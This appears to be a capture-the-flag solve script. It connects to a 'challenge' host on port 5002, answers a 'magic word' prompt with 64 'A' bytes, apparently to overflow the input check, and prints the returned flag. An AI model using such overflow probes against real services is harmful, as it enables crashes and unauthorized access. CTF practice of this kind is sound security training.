import socket

s = socket.socket()
s.connect(("challenge", 5002))
s.recv(1024)  # "Enter the magic word: "
s.send(b"A" * 64)
flag = s.recv(1024).decode().strip()
s.close()

print(flag)
